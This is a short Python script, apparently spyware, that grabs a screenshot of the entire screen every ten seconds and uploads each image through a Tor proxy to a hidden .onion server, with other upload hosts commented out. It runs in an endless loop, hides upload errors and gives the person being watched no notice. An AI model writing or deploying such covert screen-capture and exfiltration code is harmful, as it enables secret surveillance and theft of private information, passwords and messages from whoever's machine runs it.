import os
import time
import requests
from PIL import ImageGrab
from datetime import datetime
import schedule

# Configuration
SAVE_DIR = os.path.join(os.getcwd(), "screenshots")  # Ensure absolute path

# ngrok http --url=secure-bluegill-purely.ngrok-free.app 5000
# UPLOAD_URL = "https://secure-bluegill-purely.ngrok-free.app/upload_screenshot"
UPLOAD_URL = "4k3cs34r5ycnbqaihxwa5m7e2eu4ilmxczrdolzu6taewecpl7w4w5id.onion/upload_screenshot"
# UPLOAD_URL = "https://crmss.pythonanywhere.com/upload_screenshot"
# UPLOAD_URL = "http://127.0.0.1:5000/upload_screenshot"

# Ensure the directory for saving screenshots exists
os.makedirs(SAVE_DIR, exist_ok=True)

def take_screenshot():
    """Take a screenshot and save it locally."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(SAVE_DIR, f"screenshot_{timestamp}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(filepath, "PNG")
    print(f"\nScreenshot saved to {filepath}")
    return filepath

def upload_screenshot(filepath):
    """Upload the screenshot to the server via the Tor network."""
    if not filepath:
        return
    with open(filepath, "rb") as file:
        files = {"file": file}
        proxies = {
            "http": "socks5h://127.0.0.1:9050",
            "https": "socks5h://127.0.0.1:9050",
        }
        try:
            response = requests.post(UPLOAD_URL, files=files, proxies=proxies, timeout=30)
            if response.status_code == 200:
                print(f"Screenshot {filepath} uploaded successfully!")
            else:
                print(f"Failed to upload {filepath}: {response.status_code} - {response.text}")
        except requests.exceptions.RequestException as e:
            # print(f"Error during upload: {e}")
            pass

def job():
    """Take and upload a screenshot."""
    filepath = take_screenshot()
    upload_screenshot(filepath)

# Schedule the task every 10 seconds
schedule.every(10).seconds.do(job)

# Main loop to keep the scheduler running
print("\nStarting the auto-screenshot uploader...")
while True:
    schedule.run_pending()
    time.sleep(1)

